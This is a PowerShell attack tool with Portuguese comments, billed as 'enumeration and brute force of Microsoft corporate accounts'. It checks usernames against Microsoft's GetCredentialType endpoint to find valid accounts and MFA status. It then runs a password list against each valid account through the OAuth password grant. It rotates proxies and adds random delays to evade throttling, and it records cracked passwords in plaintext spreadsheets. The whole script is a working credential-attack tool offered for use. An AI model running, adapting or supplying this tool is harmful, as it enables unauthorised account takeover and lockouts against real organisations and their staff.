param(
    [string]$Domain   = "empresa.com",
    [string]$UserList = ".\users.txt",
    [switch]$TestLogin,
    [Alias("nq")]
    [switch]$NoQuestion,
    [string]$Proxy,
    [string[]]$ProxyList,
    [switch]$ProxyUseDefaultCredentials,
    [Alias("h")]
    [switch]$Help
    )

function Show-Usage {
    Write-Host ""
    Write-Host "USO" -ForegroundColor Cyan
    Write-Host "  .\enum_passs_brute_fixed_v2.ps1 -Domain <dominio> -UserList <arquivo> [opcoes]"
    Write-Host ""
    Write-Host "PARAMETROS" -ForegroundColor Cyan
    Write-Host "  -Domain <dominio>                  Dominio alvo. Ex: empresa.onmicrosoft.com"
    Write-Host "  -UserList <arquivo>                Arquivo com usuarios, um por linha"
    Write-Host "  -TestLogin                         Testa login para usuarios validos"
    Write-Host "  -NoQuestion, -nq                   Nao pergunta antes de testar login"
    Write-Host "  -Proxy <url>                       Usa um proxy unico"
    Write-Host "  -ProxyList <url1>,<url2>           Usa um ou mais proxies com rotacao"
    Write-Host "  -ProxyUseDefaultCredentials        Usa credenciais Windows no proxy"
    Write-Host "  -Help, -h                          Mostra esta ajuda"
    Write-Host ""
    Write-Host "EXEMPLOS" -ForegroundColor Cyan
    Write-Host "  .\enum_passs_brute_fixed_v2.ps1 -Domain empresa.onmicrosoft.com -UserList .\users.txt"
    Write-Host "  .\enum_passs_brute_fixed_v2.ps1 -Domain empresa.onmicrosoft.com -UserList .\users.txt -TestLogin -nq"
    Write-Host "  .\enum_passs_brute_fixed_v2.ps1 -Domain empresa.onmicrosoft.com -UserList .\users.txt -TestLogin -Proxy `"http://127.0.0.1:8080`""
    Write-Host "  .\enum_passs_brute_fixed_v2.ps1 -Domain empresa.onmicrosoft.com -UserList .\users.txt -TestLogin -ProxyList `"http://127.0.0.1:8080`",`"http://127.0.0.1:8081`""
    Write-Host ""
}

if ($Help) {
    Show-Usage
    exit
}

Write-Host "===============================================================================" -ForegroundColor DarkGray
Write-Host "    _____ _   _ _   _ __  __     __  __ ____" -ForegroundColor Cyan
Write-Host "   | ____| \ | | | | |  \/  |   |  \/  / ___|" -ForegroundColor Cyan
Write-Host "   |  _| |  \| | | | | |\/| |   | |\/| \___ \" -ForegroundColor Cyan
Write-Host "   | |___| |\  | |_| | |  | |   | |  | |___) |" -ForegroundColor Cyan
Write-Host "   |_____|_| \_|\___/|_|  |_|   |_|  |_|____/" -ForegroundColor Cyan
Write-Host "`n`n"
Write-Host "             ENUM MS CORPORATE" -ForegroundColor Yellow
Write-Host "------------------------------------------------------------------------------" -ForegroundColor DarkGray
Write-Host " ferramenta para enumeracao e brute force de contas corporativas da Microsoft" -ForegroundColor Gray
Write-Host "==============================================================================`n`n" -ForegroundColor DarkGray

# =========================
# CONFIG
# =========================
$ClientId = "04b07795-8ddb-461a-bbee-02f9e1bf7b46" # Azure CLI

# Verificar e instalar módulo do MSAL.PS se necessário
if (!(Get-Module -ListAvailable -Name MSAL.PS)) {
    Write-Host "[+] Instalando mÃ³dulo MSAL.PS..." -ForegroundColor Cyan
    Install-Module -Name MSAL.PS -Force -Scope CurrentUser -AllowClobber
}

# Importar módulo MSAL.PS
Import-Module MSAL.PS -ErrorAction Stop

if (!(Get-Module -ListAvailable -Name ImportExcel)) {
    Write-Host "[+] Instalando modulo ImportExcel..." -ForegroundColor Cyan
    Install-Module -Name ImportExcel -Force -Scope CurrentUser -AllowClobber
}

Import-Module ImportExcel -ErrorAction Stop

if (!(Test-Path $UserList)) {
    Write-Host "[ERRO] Wordlist nÃ£o encontrada: $UserList" -ForegroundColor Red
    exit
}

$timestamp  = Get-Date -Format "yyyyMMdd_HHmmss"
$outputFile = "enum_ms_$timestamp.xlsx"

$url = "https://login.microsoftonline.com/common/GetCredentialType"

$valid   = 0
$invalid = 0
$unknown = 0

Write-Host "`n[+] Iniciando enumeraÃ§Ã£o..." -ForegroundColor Cyan

$loginStatusColors = @{
    "SENHA_INCORRETA"            = "Yellow"
    "LOGIN_OK MAS MFA REQUERIDO" = "DarkYellow"
    "LOGIN_OK"                   = "Green"
    "CONTA_BLOQUEADA"            = "Red"
    "CONTA_EM_OUTRO_TENANT"      = "Yellow"
    "USUARIO_NAO_ENCONTRADO"     = "DarkGray"
    "ERRO"                       = "DarkGray"
}


$resultDir = "enum_resultados"
New-Item -ItemType Directory -Path $resultDir -Force | Out-Null

$fileValidos         = Join-Path $resultDir "validos.xlsx"
$fileSenhaIncorreta  = Join-Path $resultDir "senha_incorreta.xlsx"
$fileMfaRequerido    = Join-Path $resultDir "mfa_requerido.xlsx"
$fileBloqueados      = Join-Path $resultDir "bloqueados.xlsx"
$fileOutros          = Join-Path $resultDir "outros.xlsx"
$fileResumo          = Join-Path $resultDir "resumo.xlsx"

$allResults = New-Object System.Collections.Generic.List[object]
$validosResults = New-Object System.Collections.Generic.List[object]
$senhaIncorretaResults = New-Object System.Collections.Generic.List[object]
$mfaRequeridoResults = New-Object System.Collections.Generic.List[object]
$bloqueadosResults = New-Object System.Collections.Generic.List[object]
$outrosResults = New-Object System.Collections.Generic.List[object]


function no_question {
    param(
        [switch]$NoQuestion
    )
    return $NoQuestion.IsPresent
}

function Save-Result {
    param (
        [pscustomobject]$Result,
        [string]$LoginStatus
    )

    $script:allResults.Add($Result) | Out-Null

    switch ($LoginStatus) {
        "LOGIN_OK" {
            $script:validosResults.Add($Result) | Out-Null
        }
        "SENHA_INCORRETA" {
            $script:senhaIncorretaResults.Add($Result) | Out-Null
        }
        "LOGIN_OK MAS MFA REQUERIDO" {
            $script:mfaRequeridoResults.Add($Result) | Out-Null
        }
        "CONTA_BLOQUEADA" {
            $script:bloqueadosResults.Add($Result) | Out-Null
        }
        default {
            $script:outrosResults.Add($Result) | Out-Null
        }
    }
}

function Export-XlsxResult {
    param (
        [Parameter(Mandatory = $true)]
        [string]$Path,

        [object[]]$Data,

        [string]$WorksheetName = "Resultados"
    )

    if (Test-Path $Path) {
        Remove-Item -Path $Path -Force
    }

    if ($Data.Count -eq 0) {
        $Data = @([pscustomobject]@{
            Mensagem = "Sem resultados"
        })
    }

    $Data | Export-Excel -Path $Path -WorksheetName $WorksheetName -AutoSize -BoldTopRow -FreezeTopRow
}

function Get-ActiveProxyList {
    $proxies = New-Object System.Collections.Generic.List[string]

    if (-not [string]::IsNullOrWhiteSpace($Proxy)) {
        $proxies.Add($Proxy) | Out-Null
    }

    if ($ProxyList) {
        foreach ($proxyItem in $ProxyList) {
            if (-not [string]::IsNullOrWhiteSpace($proxyItem)) {
                $proxies.Add($proxyItem) | Out-Null
            }
        }
    }

    return $proxies.ToArray()
}

function Set-RequestProxy {
    param(
        [string[]]$Proxies
    )

    if ($Proxies -and $Proxies.Count -gt 0) {
        $proxyAtual = Get-Random -InputObject $Proxies

        $global:PSDefaultParameterValues["Invoke-RestMethod:Proxy"] = $proxyAtual
        $global:PSDefaultParameterValues["Invoke-WebRequest:Proxy"] = $proxyAtual

        if ($ProxyUseDefaultCredentials) {
            $global:PSDefaultParameterValues["Invoke-RestMethod:ProxyUseDefaultCredentials"] = $true
            $global:PSDefaultParameterValues["Invoke-WebRequest:ProxyUseDefaultCredentials"] = $true
        }
        else {
            $global:PSDefaultParameterValues.Remove("Invoke-RestMethod:ProxyUseDefaultCredentials") | Out-Null
            $global:PSDefaultParameterValues.Remove("Invoke-WebRequest:ProxyUseDefaultCredentials") | Out-Null
        }

        Write-Host "[*] Usando proxy: $proxyAtual" -ForegroundColor DarkGray
        return $proxyAtual
    }

    $global:PSDefaultParameterValues.Remove("Invoke-RestMethod:Proxy") | Out-Null
    $global:PSDefaultParameterValues.Remove("Invoke-WebRequest:Proxy") | Out-Null
    $global:PSDefaultParameterValues.Remove("Invoke-RestMethod:ProxyUseDefaultCredentials") | Out-Null
    $global:PSDefaultParameterValues.Remove("Invoke-WebRequest:ProxyUseDefaultCredentials") | Out-Null

    return $null
}

$activeProxies = Get-ActiveProxyList
if ($activeProxies.Count -gt 0) {
    Write-Host "[+] Proxy habilitado: $($activeProxies.Count) configurado(s)" -ForegroundColor Cyan
}
else {
    Write-Host "[+] Nenhum proxy configurado (conexao direta)" -ForegroundColor DarkGray
}


# =========================
# LOOP PRINCIPAL
# =========================

foreach ($user in Get-Content $UserList) {

    if ([string]::IsNullOrWhiteSpace($user)) { continue }

    $email = "$user@$Domain"
    $body  = @{ Username = $email } | ConvertTo-Json
    $tentativasLoginRegistradas = 0

    try {
        # =========================
        # Enumarção / Existencia
        # =========================
        Set-RequestProxy -Proxies $activeProxies | Out-Null

        $response = Invoke-RestMethod -Method POST `
                                     -Uri $url `
                                     -Body $body `
                                     -ContentType "application/json"

        $status      = "DESCONHECIDO"
        $mfaStatus   = "NAO_DETECTADO"
        $loginStatus = "NAO_TESTADO"

        if ($response.IfExistsResult -eq 0) {
            $status = "VALIDO"
            $valid++
        }
        elseif ($response.IfExistsResult -eq 1) {
            $status = "INVALIDO"
            $invalid++
        }
        else {
            $unknown++
        }

        # =========================
        # MFA (DETECÇÃO)
        # =========================
        if ($response.PSObject.Properties.Name -contains "IsMfaRegistered" -and $response.IsMfaRegistered) {
            $mfaStatus = "MFA_REGISTRADO"
        }
        elseif ($response.PSObject.Properties.Name -contains "EstsProperties" -and $response.EstsProperties.MfaRequired) {
            $mfaStatus = "MFA_REQUERIDO"
        }

        if ($response.PSObject.Properties.Name -contains "Credentials") {
            foreach ($cred in $response.Credentials) {
                if ($cred.Type -in @("PhoneApp","OneWaySms","TwoWaySms")) {
                    $mfaStatus = "MFA_DETECTADO"
                    break
                }
            }
        }

        if ($response.PSObject.Properties.Name -contains "ThrottleStatus" -and $response.ThrottleStatus -eq 1) {
            $mfaStatus = "MFA_POSSIVEL"
        }

        # =========================
        # DECISÃO: testar login
        # =========================
        $doLogin = $false

        if ($TestLogin -and $status -eq "VALIDO") {

            if (no_question -NoQuestion $NoQuestion) {
                $doLogin = $true
            }
            else {
                Write-Host "`n----------------------------------------`n"
                Write-Host "[?] Testar login para $email ?" -ForegroundColor Yellow
                $choice = Read-Host "[y/N]"
                if ($choice -eq "y") { $doLogin = $true }
            }
        }
        # =========================
        # LOGIN (Se autorizado pelo usuário)
        # =========================
        if ($doLogin) {
            Write-Host "`n----------------------------------------`n"
            
            # Caminho do arquivo com as senhas (uma por linha)
            $caminhoSenhas = "senhas.txt" 

            if (Test-Path $caminhoSenhas) {
                $listaSenhas = Get-Content $caminhoSenhas
                
                # Obter o TenantID uma única vez antes do loop para ser mais rápido
                try {
                    Set-RequestProxy -Proxies $activeProxies | Out-Null

                    $tenantResponse = Invoke-RestMethod `
                        -Uri "https://login.microsoftonline.com/$Domain/.well-known/openid-configuration" `
                        -ErrorAction Stop
                    $tenantId = $tenantResponse.token_endpoint.Split('/')[3]
                    $tokenUrl = "https://login.microsoftonline.com/$tenantId/oauth2/v2.0/token"
                } catch {
                    Write-Host "Erro ao resolver domÃ­nio: $($_.Exception.Message)" -ForegroundColor Red
                    $listaSenhas = @() # Impede a entrada no loop
                }

                foreach ($plainPass in $listaSenhas) {
                    if ([string]::IsNullOrWhiteSpace($plainPass)) { continue }

                    $pararTesteSenhas = $false
                    Write-Host "A testar senha: $plainPass" -ForegroundColor Cyan

                    try {
                        Set-RequestProxy -Proxies $activeProxies | Out-Null

                        $body = @{
                            client_id  = $ClientId
                            scope      = "https://graph.microsoft.com/.default"
                            username   = $email
                            password   = $plainPass
                            grant_type = "password"
                        }

                        $tokenResponse = Invoke-RestMethod -Method POST -Uri $tokenUrl -Body $body -ErrorAction Stop

                        if ($tokenResponse.access_token) {
                            $loginStatus = "LOGIN_OK"
                            $pararTesteSenhas = $true
                            $objResultado = [pscustomobject]@{
                                Email  = $email
                                Status = $loginStatus
                                Senha  = $plainPass 
                                Data   = (Get-Date -Format "dd/MM/yyyy HH:mm:ss")
                            }
                            Write-Host "âœ… Sucesso para: $email" -ForegroundColor Green
                            Save-Result -Result ([pscustomobject]@{
                                DataHora    = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                                Email       = $email
                                Status      = $status
                                MFA         = $mfaStatus
                                LoginStatus = $loginStatus
                                Senha       = $plainPass
                            }) -LoginStatus $loginStatus
                            $tentativasLoginRegistradas++
                            break # Para o loop se encontrar a senha correta
                        }
                    }
                    catch {
                        $errorResponse = $_.ErrorDetails.Message
                        if (-not $errorResponse) { $errorResponse = $_.Exception.Message }

                        try {
                            $errorJson = $errorResponse | ConvertFrom-Json
                            $errorDesc = $errorJson.error_description

                            switch -Regex ($errorDesc) {
                                "AADSTS50126" {
                                    $loginStatus = "SENHA_INCORRETA"
                                }
                                "AADSTS50076|AADSTS50079" {
                                    $loginStatus = "LOGIN_OK MAS MFA REQUERIDO"
                                    if ($mfaStatus -eq "NAO_DETECTADO") { $mfaStatus = "MFA_REQUERIDO" }
                                    $pararTesteSenhas = $true
                                    break # Interrompe o loop pois a senha está correta, mas barrou no MFA
                                }
                                "AADSTS50053" { 
                                    $loginStatus = "CONTA_BLOQUEADA"
                                    $pararTesteSenhas = $true
                                    break # Para de tentar se a conta for bloqueada
                                }
                                "AADSTS50034" { 
                                    $loginStatus = "USUARIO_NAO_ENCONTRADO" 
                                    $pararTesteSenhas = $true
                                    break # Para de tentar se o email não existir
                                }
                                default { $loginStatus = "ERRO" }
                            }
                        }
                        catch {
                            $loginStatus = "ERRO"
                        }
                        
                                # Exibe o status da tentativa atual
                        Write-Host "Status para [$plainPass]: $loginStatus" -ForegroundColor Yellow

                        Save-Result -Result ([pscustomobject]@{
                            DataHora    = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                            Email       = $email
                            Status      = $status
                            MFA         = $mfaStatus
                            LoginStatus = $loginStatus
                            Senha       = $plainPass
                        }) -LoginStatus $loginStatus
                        $tentativasLoginRegistradas++

                        # faz o sleep se não tiver acertado a senha (evita esperar à toa no final)
                        if ($loginStatus -eq "SENHA_INCORRETA" -or $loginStatus -eq "ERRO") {
                            $tempoAleatorio = Get-Random -Minimum 1 -Maximum 3 
                            Write-Host "Aguardando $tempoAleatorio segundos..." -ForegroundColor Gray
                            Start-Sleep -Seconds $tempoAleatorio
                        }

                        if ($pararTesteSenhas) {
                            break
                        }
                    } # Fim do foreach Senhas
                }
            }
        } # Fim do foreach Emails

        # =========================
        # OUTPUT
        # =========================
        Write-Host "$email -> " -ForegroundColor DarkGray -NoNewline

        $statusColor = if ($status -eq "VALIDO") { "Yellow" } else { "DarkGray" }
        Write-Host "$status | " -ForegroundColor $statusColor -NoNewline

        $mfaColor = switch ($mfaStatus) {
            "MFA_REQUERIDO"  { "Blue" }
            "MFA_DETECTADO" { "Yellow" }
            default         { "DarkGray" }
        }
        Write-Host "MFA: $mfaStatus | " -ForegroundColor $mfaColor -NoNewline

        $loginColor = $loginStatusColors[$loginStatus]
        if (-not $loginColor) { $loginColor = "DarkGray" }
        Write-Host "LOGIN: $loginStatus" -ForegroundColor $loginColor

        if ($tentativasLoginRegistradas -eq 0) {
            $result = [pscustomobject]@{
                DataHora    = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                Email       = $email
                Status      = $status
                MFA         = $mfaStatus
                LoginStatus = $loginStatus
                Senha       = ""
            }

            Save-Result -Result $result -LoginStatus $loginStatus
        }
    }
    catch {
        Write-Host "$email -> ERRO" -ForegroundColor Red

        Save-Result -Result ([pscustomobject]@{
            DataHora    = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
            Email       = $email
            Status      = "ERRO"
            MFA         = "NAO_DETECTADO"
            LoginStatus = "ERRO"
            Senha       = ""
        }) -LoginStatus "ERRO"
    }

    Start-Sleep -Milliseconds (Get-Random -Minimum 300 -Maximum 900)
}

# =========================
# RESUMO
# =========================

$summary = @"
=========================
RESUMO
=========================
VALIDOS:       $valid
INVALIDOS:     $invalid
DESCONHECIDOS: $unknown
=========================
"@

Write-Host "`n$summary" -ForegroundColor Cyan

$summaryData = @(
    [pscustomobject]@{ Metrica = "VALIDOS"; Valor = $valid },
    [pscustomobject]@{ Metrica = "INVALIDOS"; Valor = $invalid },
    [pscustomobject]@{ Metrica = "DESCONHECIDOS"; Valor = $unknown }
)

if (Test-Path $outputFile) {
    Remove-Item -Path $outputFile -Force
}

$masterResults = $allResults.ToArray()
if ($masterResults.Count -eq 0) {
    $masterResults = @([pscustomobject]@{
        Mensagem = "Sem resultados"
    })
}

$masterResults | Export-Excel -Path $outputFile -WorksheetName "Resultados" -AutoSize -BoldTopRow -FreezeTopRow
$summaryData | Export-Excel -Path $outputFile -WorksheetName "Resumo" -Append -AutoSize -BoldTopRow -FreezeTopRow

Export-XlsxResult -Path $fileValidos -Data $validosResults.ToArray()
Export-XlsxResult -Path $fileSenhaIncorreta -Data $senhaIncorretaResults.ToArray()
Export-XlsxResult -Path $fileMfaRequerido -Data $mfaRequeridoResults.ToArray()
Export-XlsxResult -Path $fileBloqueados -Data $bloqueadosResults.ToArray()
Export-XlsxResult -Path $fileOutros -Data $outrosResults.ToArray()
Export-XlsxResult -Path $fileResumo -Data $summaryData -WorksheetName "Resumo"

Write-Host "[+] Arquivo geral XLSX: $outputFile" -ForegroundColor Green
Write-Host "[+] Resultados XLSX em: $resultDir" -ForegroundColor Green
 
